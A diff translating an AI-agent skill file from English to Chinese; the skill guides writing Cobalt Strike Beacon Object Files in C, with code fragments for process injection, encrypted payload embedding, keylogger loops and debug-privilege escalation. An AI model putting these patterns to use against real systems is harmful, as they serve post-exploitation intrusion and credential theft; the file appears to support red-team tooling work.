@@ -1,32 +1,26 @@
 ---
 name: c-bof
 description: >
-  This skill should be used when the user asks about "c-bof", "create a BOF",
-  "convert a C PoC into a BOF", "resolve BOF linking/entrypoint errors",
-  "needs patterns for DFR, heap management, injection, key-value state,
-  multi-mode BOFs", "embedded payloads". Generate, compile, and debug Beacon
-  Object Files (BOF) in C for Cobalt Strike and compatible C2 frameworks.
+  此技能适用于用户询问关于 "c-bof"、"创建 BOF"、"将 C PoC 转换为 BOF"、"解决 BOF 链接/入口点错误"、"需要 DFR、堆管理、注入、键值状态、多模式 BOF 的模式"、"嵌入式 payload" 等内容。为 Cobalt Strike 及兼容 C2 框架生成、编译和调试 C 语言的 Beacon 对象文件 (BOF)。
 ---
 
 # C Beacon Object Files (BOF) Development
 
-This skill produces production-quality BOFs in C following the official
-[BOF Template](https://github.com/Cobalt-Strike/bof_template) conventions.
-Patterns are derived from real-world BOFs covering process injection, credential
-access, keylogging, memory dumping, and encrypted payload delivery.
+本技能遵循官方 [BOF Template](https://github.com/Cobalt-Strike/bof_template) 约定，生成生产级 BOF C 代码。
+模式来源于涵盖进程注入 (process injection)、凭据访问、键盘记录、内存转储和加密 payload 投递的真实 BOF 案例。
 
-## When to use
+## 适用场景
 
-- User says *"create a BOF that…"* or *"write a BOF for…"*
-- Converting an existing C PoC into a BOF
-- Errors like `undefined reference to 'Beacon*'` or `.text section too large`
-- Need patterns for DFR, heap management, injection, embedded payloads, multi-mode
+- 用户说 *"创建一个 BOF 来…"* 或 *"编写一个 BOF 用于…"*
+- 将已有 C PoC 转换为 BOF
+- 出现 `undefined reference to 'Beacon*'` 或 `.text section too large` 等错误
+- 需要 DFR、堆管理、注入、嵌入式 payload、多模式 BOF 的模式
 
 ---
 
-## Step 1 — File header convention
+## 步骤 1 — 文件头约定
 
-Every BOF source file begins with a structured doc block:
+每个 BOF 源文件以结构化注释块开头：
 
 ```c
 /**
@@ -47,9 +41,9 @@ Every BOF source file begins with a structured doc block:
 
 ---
 
-## Step 2 — DFR declarations (grouped by module)
+## 步骤 2 — DFR 声明（按模块分组）
 
-Group imports by DLL with aligned formatting. Declare every Win32 call used:
+按 DLL 分组并对齐格式。声明每一个使用的 Win32 调用：
 
 ```c
 /* ── KERNEL32 ─────────────────────────────────────────── */
@@ -77,13 +71,13 @@ DECLSPEC_IMPORT void*   __cdecl MSVCRT$memcpy(void*, const void*, size_t);
 DECLSPEC_IMPORT void*   __cdecl MSVCRT$memset(void*, int, size_t);
 ```
 
-> Group order: KERNEL32 → ADVAPI32 → NTDLL → USER32 → MSVCRT → others.
+> 分组顺序：KERNEL32 → ADVAPI32 → NTDLL → USER32 → MSVCRT → 其他。
 
 ---
 
-## Step 3 — Heap management
+## 步骤 3 — 堆管理
 
-**Never use `malloc`/`free`/`calloc`.** Use the process heap via DFR:
+**禁止使用 `malloc`/`free`/`calloc`。** 通过 DFR 使用进程堆：
 
 ```c
 HANDLE heap = KERNEL32$GetProcessHeap();
@@ -96,13 +90,13 @@ if (!buf) {
 KERNEL32$HeapFree(heap, 0, buf);
 ```
 
-For format buffers managed by Beacon, use `BeaconFormatAlloc`/`BeaconFormatFree`.
+对于由 Beacon 管理的格式化缓冲区，使用 `BeaconFormatAlloc`/`BeaconFormatFree`。
 
 ---
 
-## Step 4 — Argument handling
+## 步骤 4 — 参数处理
 
-Arguments are packed by CNA `bof_pack()` and parsed in exact order:
+参数由 CNA 的 `bof_pack()` 打包，并按确定顺序解析：
 
 ```c
 datap parser;
@@ -112,36 +106,36 @@ int    pid   = BeaconDataInt(&parser);     /* i */
 char*  path  = BeaconDataExtract(&parser, NULL); /* z */
 ```
 
-| Function | Returns | Pack char |
+| 函数 | 返回值 | 打包字符 |
 |----------|---------|-----------|
 | `BeaconDataInt(&p)` | `int` | `i` |
 | `BeaconDataShort(&p)` | `short` | `s` |
 | `BeaconDataExtract(&p, &sz)` | `char*` | `z` / `Z` |
-| `BeaconDataLength(&p)` | `int` | (length prefix) |
+| `BeaconDataLength(&p)` | `int` | （长度前缀） |
 
 ---
 
-## Step 5 — Compilation
+## 步骤 5 — 编译
 
 ```bash
 ./scripts/build_bof.sh mybof.c
 ```
 
-| Flag | Purpose |
+| 参数 | 用途 |
 |------|---------|
-| `-m64 -c` | Target x64, compile only (no linking) |
-| `-fno-asynchronous-unwind-tables` | Reduce `.eh_frame` section |
-| `-fpack-struct=8` | Match Beacon struct packing |
-| `-ffunction-sections -fdata-sections` | Allow section stripping |
-| `-s` | Strip symbols |
+| `-m64 -c` | 目标 x64，仅编译（不链接） |
+| `-fno-asynchronous-unwind-tables` | 减少 `.eh_frame` 节体积 |
+| `-fpack-struct=8` | 匹配 Beacon 的结构体对齐 |
+| `-ffunction-sections -fdata-sections` | 允许节裁剪 |
+| `-s` | 去除符号 |
 
 ---
 
-## Advanced patterns
+## 高级模式
 
-### Multi-mode BOF
+### 多模式 BOF
 
-A single BOF handles multiple operations via a mode integer:
+单个 BOF 通过模式整型处理多种操作：
 
 ```c
 #define MODE_FREEZE   1
@@ -163,11 +157,11 @@ void go(char* args, int len) {
 }
 ```
 
-CNA dispatches modes: `bof_pack($1, "ii", 1, $pid)`.
+CNA 分发模式：`bof_pack($1, "ii", 1, $pid)`。
 
-### Key/Value Store — cross-invocation state (CS 4.9+)
+### 键值存储 — 跨调用状态持久化（CS 4.9+）
 
-Persist data between BOF calls within the same Beacon session:
+在同一 Beacon 会话的多次 BOF 调用之间持久化数据：
 
 ```c
 #define KEY_HANDLE "myBof_handle"
@@ -188,11 +182,11 @@ KERNEL32$CloseHandle(hProc);
 BeaconRemoveValue(KEY_HANDLE);
 ```
 
-> Beacon does NOT free stored memory. The BOF must manage lifetimes.
+> Beacon **不会**释放已存储的内存，BOF 必须自行管理生命周期。
 
-### Ntdll dynamic resolution
+### Ntdll 动态解析
 
-When DFR won't work (e.g. undocumented Nt* functions), resolve at runtime:
+当 DFR 不可用时（如未文档化的 Nt* 函数），在运行时动态解析：
 
 ```c
 typedef NTSTATUS (NTAPI *fnNtSuspendProcess)(HANDLE);
@@ -208,7 +202,7 @@ if (!pNtSuspendProcess) {
 NTSTATUS status = pNtSuspendProcess(hProcess);
 ```
 
-### Process injection pattern
+### 进程注入模式
 
 ```c
 LPVOID remoteBuf = KERNEL32$VirtualAllocEx(hProc, NULL, payloadSize,
@@ -226,9 +220,9 @@ HANDLE hThread = KERNEL32$CreateRemoteThread(hProc, NULL, 0,
     (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
 ```
 
-### Embedded encrypted payload
+### 嵌入式加密 payload
 
-Include encrypted blobs from a generated header:
+从生成的头文件中包含加密 blob：
 
 ```c
 #include "payload.h"  /* enc_payload[], enc_key[], enc_nonce[], enc_payload_len */
@@ -245,7 +239,7 @@ secure_zero(enc_key, sizeof(enc_key));
 secure_zero(enc_nonce, sizeof(enc_nonce));
 ```
 
-### Named pipe IPC
+### 命名管道 IPC
 
 ```c
 wchar_t pipeName[128];
@@ -259,7 +253,7 @@ KERNEL32$ConnectNamedPipe(hPipe, NULL);
 /* ReadFile loop → BeaconOutput */
 ```
 
-### Error handling helpers
+### 错误处理辅助函数
 
 ```c
 static void PrintWin32Error(const char* context) {
@@ -284,9 +278,9 @@ static BOOL EnableDebugPrivilege(void) {
 }
 ```
 
-### Custom struct definitions
+### 自定义结构体定义
 
-When SDK headers are unavailable, define structs manually:
+当 SDK 头文件不可用时，手动定义结构体：
 
 ```c
 #pragma pack(push, 1)
@@ -301,9 +295,9 @@ typedef struct _MY_SYSTEM_PROCESS_INFO {
 #pragma pack(pop)
 ```
 
-### Long-running BOF (message pump)
+### 长时间运行的 BOF（消息泵）
 
-For BOFs that run indefinitely (keyloggers, monitors):
+对于无限期运行的 BOF（键盘记录器、监视器）：
 
 ```c
 static BOOL g_running = TRUE;
@@ -336,7 +330,7 @@ void go(char* args, int len) {
 
 ---
 
-## Complete example — process_freeze.c
+## 完整示例 — process_freeze.c
 
 ```c
 /**
@@ -422,13 +416,13 @@ void go(char* args, int len) {
 
 ---
 
-## Support files
+## 支持文件
 
-| File | Description |
+| 文件 | 描述 |
 |------|-------------|
-| `scripts/bof_template.c`           | Production-quality BOF skeleton |
-| `scripts/build_bof.sh`             | Compiler wrapper with optimized flags |
-| `scripts/extract_arguments.py`     | Parse and pretty-print BOF argument packs |
-| `references/REFERENCE.md`          | Full Beacon API reference (CS 4.12) and error table |
-| `assets/beacon.h`                  | Official Cobalt Strike beacon header (CS 4.12) |
-| `assets/beacon_compatibility.h`    | Convenience macros, missing mingw typedefs (LUID, NTSTATUS) |
+| `scripts/bof_template.c`           | 生产级 BOF 骨架代码 |
+| `scripts/build_bof.sh`             | 带优化参数的编译器封装脚本 |
+| `scripts/extract_arguments.py`     | 解析并格式化输出 BOF 参数包 |
+| `references/REFERENCE.md`          | 完整 Beacon API 参考（CS 4.12）及错误码表 |
+| `assets/beacon.h`                  | Cobalt Strike 官方 Beacon 头文件（CS 4.12） |
+| `assets/beacon_compatibility.h`    | 便捷宏、缺失的 mingw 类型定义（LUID、NTSTATUS） |
